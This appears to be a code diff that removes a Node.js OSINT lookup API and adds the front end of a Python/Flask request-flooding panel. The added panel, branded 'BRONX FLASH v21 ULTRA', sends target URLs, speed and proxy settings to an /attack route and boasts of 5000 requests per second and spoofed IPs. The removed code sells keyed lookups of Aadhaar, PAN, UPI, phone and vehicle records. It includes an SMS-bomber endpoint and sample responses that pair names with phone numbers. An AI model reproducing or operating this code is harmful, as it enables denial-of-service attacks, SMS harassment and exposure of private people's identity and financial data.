+<textarea id="customProxies" rows="2" placeholder="94.158.244.245:1080"></textarea>
+<button class="btn btn-secondary" onclick="saveProxies()">💾 Save Proxies</button>
+</div>
+
+<div class="card">
+<h3>🌐 Network</h3>
+<div style="font-size:1.3em;color:#ffd700;text-align:center;padding:8px" id="browserIP">Loading...</div>
+<button class="btn btn-secondary" onclick="copyIP()">📋 Copy IP</button>
+<button class="btn btn-cyan" onclick="testLatency()">📡 Test Latency</button>
+<div id="latencyResult" style="margin-top:6px;text-align:center"></div>
+</div>
+
+<div class="card">
+<h3>🎨 Effects (Works Here + Login)</h3>
+<div class="effect-select" id="effectSelect">
+{% for e in effects %}<span class="effect-opt{% if e==current_effect %} active{% endif %}" onclick="setEffect('{{e}}')">{{e}}</span>{% endfor %}
+</div>
+<div class="row" style="margin-top:8px">
+<button class="btn btn-reset" onclick="resetStats()">🔄 Reset Session</button>
+<button class="btn btn-reset" onclick="resetLifetime()">🗑️ Reset Lifetime</button>
+</div>
+</div>
+
+<div class="card">
+<h3>📊 Live Stats</h3>
+<div class="row3">
+<div class="stat"><div class="stat-val t" style="font-size:1.3em" id="successRate">0%</div><div class="stat-label">Success Rate</div></div>
+<div class="stat"><div class="stat-val s" style="font-size:1.3em" id="rps">0</div><div class="stat-label">Req/Sec</div></div>
+<div class="stat"><div class="stat-val" style="font-size:1.3em;color:#00c8ff" id="threadCount">0</div><div class="stat-label">Threads</div></div>
+</div>
+</div>
+</div>
+
+<div class="card"><h3>📜 Battle Logs</h3><div class="logs" id="logs"><div class="log-e">💀 BRONX FLASH v21 ULTRA - 5000 RPS Ready</div><div class="log-e">⚡ Multi-IP Engine: ACTIVE (10000 spoofed IPs)</div><div class="log-e">🔗 Session Pool: 3000 sessions loaded</div><div class="log-e">🛡️ Stealth Mode: Each request = Different IP</div><div class="log-e">System armed. Awaiting command...</div></div></div>
+<div class="footer">💀 BRONX FLASH v21 ULTRA • 5000 RPS • 3000 SESSIONS • MULTI-IP • GOD KILLER 💀</div>
+</div>
+
+<script>
+var proxyOn=false,rateOn=false,multiOn=true,rotateOn=true;
+var lastTotal=0,lastTime=Date.now();
+
+function toggleProxy(){proxyOn=!proxyOn;document.getElementById('proxyToggle').classList.toggle('on',proxyOn);document.getElementById('proxyLabel').textContent=proxyOn?'ON':'OFF'}
+function toggleRate(){rateOn=!rateOn;document.getElementById('rateToggle').classList.toggle('on',rateOn);document.getElementById('rateLabel').textContent=rateOn?'ON':'OFF'}
+function toggleMulti(){multiOn=!multiOn;document.getElementById('multiToggle').classList.toggle('on',multiOn);var l=document.getElementById('multiLabel');l.textContent=multiOn?'ON':'OFF';l.style.color=multiOn?'#00c8ff':'#666'}
+function toggleRotate(){rotateOn=!rotateOn;document.getElementById('rotateToggle').classList.toggle('on',rotateOn);var l=document.getElementById('rotateLabel');l.textContent=rotateOn?'ON':'OFF';l.style.color=rotateOn?'#00c8ff':'#666'}
+
+function saveRate(){fetch('/rate',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({enabled:rateOn,rpm:parseInt(document.getElementById('rpm').value)})})}
+function saveProxies(){fetch('/save_proxies',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({proxies:document.getElementById('customProxies').value})})}
+function saveMultiSession(){fetch('/multi_session',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({enabled:multiOn,sessions_per_url:parseInt(document.getElementById('sessionsPerUrl').value),rotating:rotateOn})})}
+function refreshSessions(){fetch('/refresh_sessions',{method:'POST'}).then(r=>r.json()).then(d=>{alert(d.status);document.getElementById('sessionDisplay').textContent=d.pool_size;document.getElementById('poolSize').textContent=d.pool_size})}
+
+function setEffect(e){
+    fetch('/effect/'+e).then(function(){
+        document.querySelectorAll('.effect-opt').forEach(function(el){el.classList.remove('active')});
+        event.target.classList.add('active');
+        applyEffect(e);
+    });
 }
-function scheduleSave() { setTimeout(async () => { await saveToStorage(); }, 2000); }
-setInterval(() => scheduleSave(), 2 * 60 * 1000);
 
-// ========== HELPERS ==========
-function getIndiaTime() { return new Date(new Date().getTime() + (5.5 * 60 * 60 * 1000)); }
-function getIndiaDate() { return getIndiaTime().toISOString().split('T')[0]; }
-function getIndiaDateTime() { return getIndiaTime().toISOString().replace('T', ' ').substring(0, 19); }
-function isKeyExpired(d) { if (!d || d === 'LIFETIME') return false; return getIndiaTime() > new Date(d); }
-function parseExpiryDate(s) { if (!s || s === 'LIFETIME') return null; const p = s.split('-'); if (p.length === 3) return p[0].length === 4 ? new Date(+p[0], +p[1] - 1, +p[2], 23, 59, 59) : new Date(+p[2], +p[1] - 1, +p[0], 23, 59, 59); const d = new Date(s); return isNaN(d.getTime()) ? null : d; }
-function checkCooldown(k) { const kd = keyStorage[k]; if (!kd || !kd.cooldown) return { allowed: true }; const n = Date.now(); if (cooldownTimers[k] && (n - cooldownTimers[k]) < (kd.cooldown * 1000)) { return { allowed: false, remaining: Math.ceil((kd.cooldown * 1000 - (n - cooldownTimers[k])) / 1000) }; } cooldownTimers[k] = n; return { allowed: true }; }
-function checkKeyValid(k) { if (!k) return { valid: false, error: 'Missing key' }; const kd = keyStorage[k]; if (!kd) return { valid: false, error: 'Key not found' }; if (kd.expiry && isKeyExpired(kd.expiry)) return { valid: false, error: 'Expired' }; if (!kd.unlimited && kd.used >= kd.limit) return { valid: false, error: 'Limit reached' }; const cd = checkCooldown(k); if (!cd.allowed) return { valid: false, error: 'Cooldown ' + cd.remaining + 's' }; return { valid: true, keyData: kd }; }
-function incrementKeyUsage(k) { if (keyStorage[k] && !keyStorage[k].unlimited) { keyStorage[k].used++; if (keyStorage[k].used % 3 === 0) scheduleSave(); } }
-function checkKeyScope(kd, ep) { if (!kd || !kd.scopes) return { valid: false }; if (kd.scopes.includes('*')) return { valid: true }; if (kd.scopes.includes(ep)) return { valid: true }; if (ep.startsWith('c/') && kd.scopes.includes('custom')) return { valid: true }; return { valid: false }; }
-function generateToken() { const c = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; let t = ''; for (let i = 0; i < 32; i++) t += c.charAt(Math.floor(Math.random() * c.length)); return t; }
-function isAdminAuth(t) { if (!t) return false; if (adminSessions[t]) { if (adminSessions[t].permanent) return true; if (Date.now() < adminSessions[t].expiresAt) return true; delete adminSessions[t]; delete permanentTokens[t]; } return false; }
-function isIPBanned(ip) { return ip && ip !== 'unknown' && bannedIPs.includes(ip); }
-function banIP(ip) { if (ip && ip !== 'unknown' && !bannedIPs.includes(ip)) { bannedIPs.push(ip); scheduleSave(); } }
-function unbanIP(ip) { const i = bannedIPs.indexOf(ip); if (i > -1) { bannedIPs.splice(i, 1); scheduleSave(); } }
-function sanitizeResponse(d) { if (!d) return d; try { const c = JSON.parse(JSON.stringify(d)); delete c.truecaller_name; delete c.cached; delete c.cached_at; delete c.by; delete c.channel; delete c.developer; delete c.api_key; delete c.real_url; delete c.source_url; delete c.internal_id; c.powered_by = "BRONX_ULTRA"; return c; } catch (e) { return d; } }
-function esc(s) { if (!s) return ''; return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#039;'); }
-function detectBrowser(ua) { if(!ua) return {name:'?',device:'?'}; let n='?'; if(ua.includes('Firefox')) n='Firefox'; else if(ua.includes('Chrome')) n='Chrome'; else if(ua.includes('Safari')) n='Safari'; let d='Desktop'; if(ua.includes('Mobile')) d='Mobile'; return {name:n,device:d}; }
-function logRequest(key, ep, param, status, ip, ua) { const b = detectBrowser(ua); requestLogs.push({ timestamp: getIndiaDateTime(), key: key ? key.substring(0, 8) + '***' : '?', endpoint: ep, param: param ? param.substring(0, 20) : '', status, ip: ip || '?', browser: b.name, device: b.device }); if (requestLogs.length > 300) requestLogs = requestLogs.slice(-300); if (requestLogs.length % 5 === 0) scheduleSave(); }
-function createMasterKey() { return { name:'👑 OWNER',scopes:['*'],type:'owner',limit:999999,used:0,cooldown:0,expiry:null,expiryStr:'LIFETIME',created:getIndiaDateTime(),unlimited:true,hidden:true }; }
-
-function initDefaultData() {
-    const now = getIndiaDateTime(); keyStorage = {}; keyStorage[MASTER_API_KEY] = createMasterKey();
-    [{ key:'BRONX_DEMO_001',name:'🎁 Premium',scopes:['*'],limit:1000,cooldown:0,expiry:'31-12-2027' },{ key:'BRONX_DEMO_002',name:'🎁 Basic',scopes:['number','aadhar','pan','upi'],limit:500,cooldown:2,expiry:'30-06-2027' },{ key:'BRONX_DEMO_003',name:'🎁 Starter',scopes:['number','ip','pincode'],limit:200,cooldown:1,expiry:'31-12-2027' },{ key:'BRONX_OP_KEY',name:'🎁 OP',scopes:['*'],limit:999,cooldown:0,expiry:'31-12-2027' },{ key:'BRONX_PRO_KEY',name:'🎁 Pro',scopes:['*'],limit:5000,cooldown:0,expiry:'31-12-2028' },{ key:'BRONX_BOMBER',name:'🎁 Bomber',scopes:['number','custom'],limit:300,cooldown:3,expiry:'31-12-2027' }].forEach(d => { keyStorage[d.key] = { name:d.name,scopes:d.scopes,type:'demo',limit:d.limit,used:0,cooldown:d.cooldown||0,expiry:parseExpiryDate(d.expiry),expiryStr:d.expiry,created:now,unlimited:false,hidden:false }; });
+function applyEffect(e){
+    var el=document.getElementById('effects');
+    el.innerHTML='';
+    if(e==='snow')for(var i=0;i<35;i++){var d=document.createElement('div');d.style.cssText='position:absolute;color:#ff0055;font-size:'+(Math.random()*8+6)+'px;left:'+Math.random()*100+'%;animation:fall '+(Math.random()*4+2)+'s linear infinite;pointer-events:none';d.textContent='❄️';el.appendChild(d)}
+    if(e==='matrix')for(var i=0;i<45;i++){var d=document.createElement('div');d.style.cssText='position:absolute;color:#00ff88;font-size:'+(Math.random()*10+5)+'px;left:'+Math.random()*100+'%;animation:fall '+(Math.random()*2+1.5)+'s linear infinite;pointer-events:none';d.textContent=String.fromCharCode(0x30A0+Math.random()*96);el.appendChild(d)}
+    if(e==='particles')for(var i=0;i<25;i++){var d=document.createElement('div');d.style.cssText='position:absolute;width:'+(Math.random()*2+1)+'px;height:'+(Math.random()*2+1)+'px;background:#ffd700;left:'+Math.random()*100+'%;animation:float '+(Math.random()*3+2)+'s ease-in-out infinite;border-radius:50%;pointer-events:none';el.appendChild(d)}
+    if(e==='cyber')for(var i=0;i<35;i++){var d=document.createElement('div');d.style.cssText='position:absolute;color:#00c8ff;font-size:'+(Math.random()*12+6)+'px;left:'+Math.random()*100+'%;animation:cyberFall '+(Math.random()*1.5+0.8)+'s linear infinite;pointer-events:none';d.textContent=Math.random()>0.5?'▓':'▒';el.appendChild(d)}
+    if(e==='stars')for(var i=0;i<20;i++){var d=document.createElement('div');d.style.cssText='position:absolute;width:2px;height:2px;background:#fff;left:'+Math.random()*100+'%;top:'+Math.random()*100+'%;animation:twinkle '+(Math.random()*1.5+0.8)+'s infinite;pointer-events:none';el.appendChild(d)}
+    if(e==='quantum')for(var i=0;i<20;i++){var d=document.createElement('div');d.style.cssText='position:absolute;width:3px;height:3px;background:#ffd700;left:'+Math.random()*100+'%;top:'+Math.random()*100+'%;animation:quantum '+(Math.random()*2+1.5)+'s infinite;border-radius:50%;box-shadow:0 0 15px #ffd700;pointer-events:none';el.appendChild(d)}
 }
 
-function initCustomAPIs() {
-    customAPIs = [
-        { id:1,name:'Number Info',endpoint:'number-advanced',param:'num',example:'9876543210',visible:true,realAPI:'https://num-tg-info-api.vercel.app/info?number={param}' },
-        { id:2,name:'Vehicle RC',endpoint:'rc-details',param:'ca_number',example:'MH02FZ0555',visible:true,realAPI:'https://rc-bala-api-bronx0.vercel.app/bronx?ca_number={param}' },
-        { id:3,name:'Aadhar',endpoint:'aadhar-verify',param:'aadhar',example:'393933081942',visible:true,realAPI:'https://bronx-king-vip999.vercel.app/api/aadhaar?num={param}' },
-        { id:4,name:'Email',endpoint:'email-lookup',param:'mail',example:'user@gmail.com',visible:true,realAPI:'https://bronx-king-mail-opi.vercel.app/mail={param}' },
-        { id:5,name:'Telegram',endpoint:'telegram-scan',param:'id',example:'7530266953',visible:true,realAPI:'https://bronx-tg-king-bro.vercel.app/tg?key=BRONXop&query={param}' },
-        { id:6,name:'SMS Bomber',endpoint:'sms-bomber',param:'number',example:'1234567890',visible:true,realAPI:'https://bronx-sms-api-ulimate.vercel.app/api/key-bronx-paid-vip?number={param}&counter=10' },
-        { id:7,name:'Number Backup',endpoint:'num-op',param:'num',example:'9876543210',visible:true,realAPI:'https://tfqdeadlo-inddataapi.hf.space/search?mobile={param}' },
-    ];
+function resetStats(){fetch('/reset',{method:'POST'}).then(u)}
+function resetLifetime(){if(confirm('Reset lifetime stats?')){fetch('/reset_lifetime',{method:'POST'}).then(u)}}
+function copyIP(){var ip=document.getElementById('browserIP').textContent;navigator.clipboard.writeText(ip);alert('IP: '+ip)}
+function testLatency(){var s=Date.now();document.getElementById('latencyResult').innerHTML='<span style="color:#ffd700">Testing...</span>';fetch('/ping').then(function(r){return r.json()}).then(function(){document.getElementById('latencyResult').innerHTML='<span style="color:#00ff88">'+(Date.now()-s)+'ms</span>'})}
+
+function u(){
+    fetch('/stats').then(function(r){return r.json()}).then(function(d){
+        document.getElementById('success').textContent=d.success;
+        document.getElementById('failed').textContent=d.failed;
+        document.getElementById('total').textContent=d.total;
+        document.getElementById('ltSuccess').textContent=d.lt_success;
+        document.getElementById('ltTotal').textContent=d.lt_total;
+        document.getElementById('activeSessions').textContent=d.active_attacks||0;
+        var total=d.success+d.failed;
+        document.getElementById('successRate').textContent=total>0?((d.success/total)*100).toFixed(1)+'%':'0%';
+        var now=Date.now();
+        var dt=now-lastTime;
+        if(dt>0){document.getElementById('rps').textContent=Math.floor((d.total-lastTotal)/(dt/1000));lastTotal=d.total;lastTime=now;}
+    });
 }
 
-const endpoints = {
-    number:{p:'num',i:'📱',e:'9876543210',d:'Mobile Lookup',c:'phone'},aadhar:{p:'num',i:'🆔',e:'393933081942',d:'Aadhaar Details',c:'phone'},name:{p:'name',i:'🔍',e:'abhiraaj',d:'Name Search',c:'phone'},numv2:{p:'num',i:'📱',e:'6205949840',d:'Number v2',c:'phone'},adv:{p:'num',i:'📱',e:'9876543210',d:'Advanced Intel',c:'phone'},adharfamily:{p:'num',i:'👨‍👩‍👧‍👦',e:'984154610245',d:'Family Details',c:'phone'},adharration:{p:'num',i:'📋',e:'701984830542',d:'Ration Card',c:'phone'},imei:{p:'imei',i:'📱',e:'357817383506298',d:'IMEI Info',c:'phone'},calltracer:{p:'num',i:'📞',e:'9876543210',d:'Call Tracer',c:'phone'},upi:{p:'upi',i:'💰',e:'example@ybl',d:'UPI Lookup',c:'finance'},ifsc:{p:'ifsc',i:'🏦',e:'SBIN0001234',d:'IFSC Details',c:'finance'},pan:{p:'pan',i:'📄',e:'AXDPR2606K',d:'PAN Card',c:'finance'},pincode:{p:'pin',i:'📍',e:'110001',d:'Pincode',c:'location'},ip:{p:'ip',i:'🌐',e:'8.8.8.8',d:'IP Lookup',c:'location'},vehicle:{p:'vehicle',i:'🚗',e:'MH02FZ0555',d:'Vehicle Info',c:'vehicle'},rc:{p:'owner',i:'📋',e:'UP92P2111',d:'RC Owner',c:'vehicle'},ff:{p:'uid',i:'🎮',e:'123456789',d:'Free Fire',c:'gaming'},bgmi:{p:'uid',i:'🎮',e:'5121439477',d:'BGMI',c:'gaming'},insta:{p:'username',i:'📸',e:'cristiano',d:'Instagram',c:'social'},git:{p:'username',i:'💻',e:'ftgamer2',d:'GitHub',c:'social'},tg:{p:'info',i:'📲',e:'JAUUOWNER',d:'Telegram',c:'social'},tgidinfo:{p:'id',i:'📲',e:'7530266953',d:'TG ID Info',c:'social'},snap:{p:'username',i:'👻',e:'priyapanchal272',d:'Snapchat',c:'social'},pk:{p:'num',i:'🇵🇰',e:'03331234567',d:'Pakistan',c:'pakistan'},pkv2:{p:'num',i:'🇵🇰',e:'3359736848',d:'Pakistan v2',c:'pakistan'}
-};
+function l(){fetch('/logs').then(function(r){return r.json()}).then(function(d){document.getElementById('logs').innerHTML=d.logs.map(function(x){return'<div class="log-e">'+x+'</div>'}).join('')})}
 
-const apiExamples = {
-    number:{req:'GET /api/key-bronx/number?key=YOUR_KEY&num=7307841587',res:'{"success":true,"number":"7307841587","results":[{"name":"Nemsingh","mobile":"7307841587","circle":"JIO UPE"}]}'},
-    aadhar:{req:'GET /api/key-bronx/aadhar?key=YOUR_KEY&num=393933081942',res:'{"success":true,"aadhar":"393933081942","results":[{"name":"J Vinod","phoneNumber":"9490160194"}]}'},
-    name:{req:'GET /api/key-bronx/name?key=YOUR_KEY&name=abhiraaj',res:'{"success":true,"name":"abhiraaj","results":[{"name":"ABHIRAAJ GAWADE","phoneNumber":"9823796702"}]}'},
-    upi:{req:'GET /api/key-bronx/upi?key=YOUR_KEY&upi=example@ybl',res:'{"success":true,"upi_id":"example@ybl","account_name":"MURENDRA SARABU","bank":"Union Bank"}'},
-    ifsc:{req:'GET /api/key-bronx/ifsc?key=YOUR_KEY&ifsc=SBIN0001234',res:'{"success":true,"ifsc":"SBIN0001234","bank":"State Bank of India","branch":"HAJIGANJ"}'},
-    pincode:{req:'GET /api/key-bronx/pincode?key=YOUR_KEY&pin=110001',res:'{"success":true,"pincode":"110001","state":"Delhi","district":"Central Delhi"}'},
-    ip:{req:'GET /api/key-bronx/ip?key=YOUR_KEY&ip=8.8.8.8',res:'{"success":true,"ip":"8.8.8.8","country":"United States","city":"Mountain View"}'},
-    vehicle:{req:'GET /api/key-bronx/vehicle?key=YOUR_KEY&vehicle=MH02FZ0555',res:'{"status":"success","data":{"rc_number":"MH02FZ0555","owner_name":"SHAH RUKH KHAN"}}'},
-    ff:{req:'GET /api/key-bronx/ff?key=YOUR_KEY&uid=123456789',res:'{"success":true,"uid":"123456789","info":{"Nickname":"BRONX","Level":"67"}}'},
-    insta:{req:'GET /api/key-bronx/insta?key=YOUR_KEY&username=cristiano',res:'{"success":true,"username":"cristiano","profile":{"followers":672571267}}'},
-    tg:{req:'GET /api/key-bronx/tg?key=YOUR_KEY&info=JAUUOWNER',res:'{"success":true,"info":"JAUUOWNER","number":"9627507420","country":"India"}'},
-};
+function start(){
+    var urls=document.getElementById('urls').value.split('\\n').filter(function(u){return u.trim()});
+    if(urls.length===0)return;
+    fetch('/attack',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({
+        urls:urls,count:parseInt(document.getElementById('count').value),
+        speed:document.getElementById('speed').value,
+        mode:document.getElementById('mode').value,
+        proxy:proxyOn
+    })}).then(function(r){return r.json()}).then(function(){
+        document.getElementById('status').innerHTML='<span class="badge badge-multi">⚡ ULTRA ATTACK ACTIVE</span>';
+        l();u();
+    });
+}
 
-app.use(express.json({limit:'50mb'})); app.use(express.urlencoded({extended:true,limit:'50mb'}));
-app.use((req,res,next)=>{res.setHeader('Access-Control-Allow-Origin','*');res.setHeader('Access-Control-Allow-Methods','GET,POST,OPTIONS');res.setHeader('Access-Control-Allow-Headers','Content-Type,x-api-key,x-admin-token');if(req.method==='OPTIONS')return res.status(200).end();next();});
-app.use((req,res,next)=>{req.clientIP=req.headers['x-forwarded-for']?.split(',')[0]?.trim()||'unknown';if(isIPBanned(req.clientIP)&&!req.path.startsWith('/admin')&&!req.path.startsWith('/docs'))return res.status(403).json({error:'IP Banned'});next();});
+function stop(){fetch('/stop',{method:'POST'}).then(function(){document.getElementById('status').innerHTML='<span style="color:#666">Terminated</span>';l()})}
 
-app.get('/',(req,res)=>{try{res.send(renderHome())}catch(e){res.status(500).send('Error')}});
-app.get('/docs',(req,res)=>{try{res.send(renderDocs())}catch(e){res.status(500).send('Error')}});
-app.get('/test',(req,res)=>{res.json({status:'✅ BRONX OSINT V100',keys:Object.keys(keyStorage).filter(k=>!keyStorage[k]?.hidden).length})});
-app.get('/key-info',(req,res)=>{const k=req.query.key;if(!k)return res.json({error:'Missing key'});const kd=keyStorage[k];if(!kd||kd.hidden)return res.json({error:'Not found'});res.json({key:k.substring(0,4)+'****',owner:kd.name,limit:kd.unlimited?'∞':kd.limit,used:kd.used,expiry:kd.expiryStr||'LIFETIME'})});
-app.get('/api/custom/:ep',async(req,res)=>{try{const api=customAPIs.find(a=>a.endpoint===req.params.ep&&a.visible);if(!api)return res.json({error:'Not found'});const key=req.query.key;if(!key)return res.json({error:'Key required'});const kc=checkKeyValid(key);if(!kc.valid)return res.json({error:kc.error});const pv=req.query[api.param]||req.query.number;if(!pv)return res.json({error:'Missing param'});let url=api.realAPI.replace(/\{param\}/gi,encodeURIComponent(pv));if(req.query.count)url=url.replace('counter=10','counter='+req.query.count);const resp=await axios.get(url,{timeout:30000});incrementKeyUsage(key);logRequest(key,'c/'+req.params.ep,pv,'success',req.clientIP,req.userAgent);res.json({...sanitizeResponse(resp.data),api_info:{remaining:kc.keyData?.unlimited?'∞':Math.max(0,(kc.keyData?.limit||0)-(kc.keyData?.used||0))}})}catch(e){res.json({error:'API error'})}});
-app.get('/api/key-bronx/:ep',async(req,res)=>{try{const ep=req.params.ep;if(!endpoints[ep])return res.json({error:'Not found'});const key=req.query.key;if(!key)return res.json({error:'Key required'});const kc=checkKeyValid(key);if(!kc.valid)return res.json({error:kc.error});const sc=checkKeyScope(kc.keyData,ep);if(!sc.valid)return res.json({error:'Scope denied'});const pv=req.query[endpoints[ep].p];if(!pv)return res.json({error:'Missing '+endpoints[ep].p});const url=`${REAL_API_BASE}/${ep}?key=${REAL_API_KEY}&${endpoints[ep].p}=${encodeURIComponent(pv)}`;const resp=await axios.get(url,{timeout:30000});incrementKeyUsage(key);logRequest(key,ep,pv,'success',req.clientIP,req.userAgent);res.json({...sanitizeResponse(resp.data),api_info:{remaining:keyStorage[key]?.unlimited?'∞':Math.max(0,(keyStorage[key]?.limit||0)-(keyStorage[key]?.used||0))}})}catch(e){res.json({error:'API error'})}});
+fetch('https://api.ipify.org?format=json').then(function(r){return r.json()}).then(function(d){document.getElementById('browserIP').textContent=d.ip});
+fetch('/pool_status').then(function(r){return r.json()}).then(function(d){document.getElementById('sessionDisplay').textContent=d.pool_size;document.getElementById('poolSize').textContent=d.pool_size});
+fetch('/current_effect').then(function(r){return r.json()}).then(function(d){if(d.effect)applyEffect(d.effect)});
+setInterval(function(){l();u();document.getElementById('liveTime').textContent=new Date().toLocaleTimeString()},1000);
+</script>
+<style>
+@keyframes fall{to{transform:translateY(110vh) rotate(360deg)}}
+@keyframes float{0%,100%{transform:translateY(0)scale(1)}50%{transform:translateY(-25px)scale(1.3)}}
+@keyframes twinkle{50%{opacity:0.15}}
+@keyframes cyberFall{to{transform:translateY(110vh)}}
+@keyframes quantum{0%,100%{transform:translate(0,0)scale(1);opacity:1}25%{transform:translate(15px,-15px)scale(1.4);opacity:0.4}50%{transform:translate(-15px,8px)scale(0.7);opacity:0.7}75%{transform:translate(8px,15px)scale(1.2);opacity:0.3}}
+</style>
+</body></html>"""
 
-app.get('/admin',(req,res)=>{try{const token=req.query.token||req.headers['x-admin-token'];if(token&&isAdminAuth(token))return res.send(renderAdmin(token));res.send(renderLogin())}catch(e){res.status(500).send('<h1>Error</h1>')}});
-app.post('/admin/login',async(req,res)=>{const{username,password}=req.body;if(username===ADMIN_USERNAME&&password===ADMIN_PASSWORD){const token=generateToken();adminSessions[token]={expiresAt:Date.now()+(365*24*60*60*1000),permanent:true};permanentTokens[token]={createdAt:getIndiaDateTime()};scheduleSave();res.json({success:true,token,message:'Access Granted',redirect:'/admin?token='+token})}else res.json({success:false,error:'Invalid'})});
-app.post('/admin/generate-key',async(req,res)=>{if(!isAdminAuth(req.headers['x-admin-token']||req.query.token))return res.json({e:'Unauthorized'});const{keyName,keyOwner,scopes,limit,cooldown,expiryDate,keyType,days}=req.body;if(!keyName||!keyOwner)return res.json({e:'Missing'});if(keyStorage[keyName])return res.json({e:'Exists'});let expiry=null,expiryStr=expiryDate||'LIFETIME';if(days&&!isNaN(days)){const d=new Date(getIndiaTime().getTime()+parseInt(days)*24*60*60*1000);expiry=d;expiryStr=d.toISOString().split('T')[0].split('-').reverse().join('-');}else if(expiryDate&&expiryDate!=='LIFETIME'){expiry=parseExpiryDate(expiryDate);expiryStr=expiryDate;}keyStorage[keyName]={name:keyOwner,scopes:scopes||['number'],type:keyType||'premium',limit:limit==='unlimited'?999999:(parseInt(limit)||100),used:0,cooldown:parseInt(cooldown)||0,expiry:expiry,expiryStr:expiryStr,created:getIndiaDateTime(),unlimited:(!days&&(!expiryDate||expiryDate==='LIFETIME'))||limit==='unlimited'||parseInt(limit)>=999999,hidden:false};scheduleSave();res.json({success:true})});
-app.post('/admin/push-key',async(req,res)=>{if(!isAdminAuth(req.headers['x-admin-token']||req.query.token))return res.json({e:'Unauthorized'});const{keyName,days}=req.body;if(!keyStorage[keyName])return res.json({e:'Not found'});const d=parseInt(days)||30;const newExp=new Date(getIndiaTime().getTime()+d*24*60*60*1000);keyStorage[keyName].expiry=newExp;keyStorage[keyName].expiryStr=newExp.toISOString().split('T')[0].split('-').reverse().join('-');keyStorage[keyName].used=0;keyStorage[keyName].unlimited=false;scheduleSave();res.json({success:true,message:`Pushed ${d} days`})});
-app.post('/admin/delete-key',async(req,res)=>{if(!isAdminAuth(req.headers['x-admin-token']||req.query.token))return res.json({e:'Unauthorized'});if(req.body.keyName===MASTER_API_KEY)return res.json({e:'Protected'});delete keyStorage[req.body.keyName];scheduleSave();res.json({success:true})});
-app.post('/admin/reset-key-usage',async(req,res)=>{if(!isAdminAuth(req.headers['x-admin-token']||req.query.token))return res.json({e:'Unauthorized'});if(keyStorage[req.body.keyName]){keyStorage[req.body.keyName].used=0;scheduleSave();res.json({success:true})}else res.json({e:'Not found'})});
-app.post('/admin/import-keys',async(req,res)=>{if(!isAdminAuth(req.headers['x-admin-token']||req.query.token))return res.json({e:'Unauthorized'});const{keys}=req.body;if(!keys||typeof keys!=='object')return res.json({e:'Invalid'});let imported=0;Object.entries(keys).forEach(([kn,kd])=>{if(kn===MASTER_API_KEY||keyStorage[kn])return;keyStorage[kn]={name:kd.name||'Imported',scopes:kd.scopes||['number'],type:kd.type||'imported',limit:kd.limit||100,used:kd.used||0,cooldown:kd.cooldown||0,expiry:kd.expiry||null,expiryStr:kd.expiryStr||'LIFETIME',created:kd.created||getIndiaDateTime(),unlimited:kd.unlimited||false,hidden:kd.hidden||false};imported++});scheduleSave();res.json({success:true,imported})});
-// UNLIMITED CUSTOM API SLOTS
-app.post('/admin/add-api',async(req,res)=>{if(!isAdminAuth(req.headers['x-admin-token']||req.query.token))return res.json({e:'Unauthorized'});const{name,endpoint,param,example,desc,realAPI}=req.body;if(!name||!endpoint)return res.json({e:'Missing fields'});const newId=customAPIs.length+1;customAPIs.push({id:newId,name,endpoint,param:param||'num',example:example||'9876543210',desc:desc||'',visible:true,realAPI:realAPI||''});scheduleSave();res.json({success:true,message:'API Added!',id:newId})});
-app.post('/admin/delete-api',async(req,res)=>{if(!isAdminAuth(req.headers['x-admin-token']||req.query.token))return res.json({e:'Unauthorized'});const{id}=req.body;const idx=customAPIs.findIndex(a=>a.id===parseInt(id));if(idx>-1){customAPIs.splice(idx,1);scheduleSave();res.json({success:true})}else res.json({e:'Not found'})});
-app.post('/admin/ban-ip',async(req,res)=>{if(!isAdminAuth(req.headers['x-admin-token']||req.query.token))return res.json({e:'Unauthorized'});const{ip}=req.body;if(!ip)return res.json({e:'Missing IP'});banIP(ip);scheduleSave();res.json({success:true})});
-app.post('/admin/unban-ip',async(req,res)=>{if(!isAdminAuth(req.headers['x-admin-token']||req.query.token))return res.json({e:'Unauthorized'});const{ip}=req.body;if(!ip)return res.json({e:'Missing IP'});unbanIP(ip);scheduleSave();res.json({success:true})});
-app.post('/admin/clear-logs',async(req,res)=>{if(!isAdminAuth(req.headers['x-admin-token']||req.query.token))return res.json({});requestLogs=[];scheduleSave();res.json({success:true})});
-app.post('/admin/reset-all',async(req,res)=>{if(!isAdminAuth(req.headers['x-admin-token']||req.query.token))return res.json({e:'Unauthorized'});Object.keys(keyStorage).forEach(k=>{if(k!==MASTER_API_KEY)keyStorage[k].used=0});scheduleSave();res.json({success:true})});
-app.use((req,res)=>{res.json({error:'Not found'})});
+# ============================================
+# FLASK ROUTES
+# ============================================
+current_effect = "cyber"
 
-function renderLogin(){return `<!DOCTYPE html><html><head><meta charset="UTF-8"><title>BRONX V100 | ADMIN</title><link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@500;700&display=swap" rel="stylesheet"><style>
-*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0f;display:flex;justify-content:center;align-items:center;min-height:100vh;font-family:'Rajdhani',sans-serif;overflow:hidden}
-body::before{content:'';position:fixed;inset:0;background:radial-gradient(ellipse at center,rgba(139,0,255,.08),transparent 70%),radial-gradient(ellipse at 80% 20%,rgba(0,200,255,.06),transparent 50%),radial-gradient(ellipse at 20% 80%,rgba(255,0,128,.05),transparent 50%);pointer-events:none;z-index:0}
-.particles{position:fixed;inset:0;pointer-events:none;z-index:0}.particle{position:absolute;width:2px;height:2px;background:#fff;border-radius:50%;animation:float 6s infinite;opacity:0}@keyframes float{0%{transform:translateY(100vh) scale(0);opacity:0}10%{opacity:1}90%{opacity:1}100%{transform:translateY(-100vh) scale(1);opacity:0}}
-.box{background:rgba(15,15,25,.9);padding:50px 40px;border-radius:20px;width:420px;border:1px solid rgba(139,0,255,.2);position:relative;z-index:1;box-shadow:0 0 80px rgba(139,0,255,.15),0 0 150px rgba(0,200,255,.08);backdrop-filter:blur(20px)}
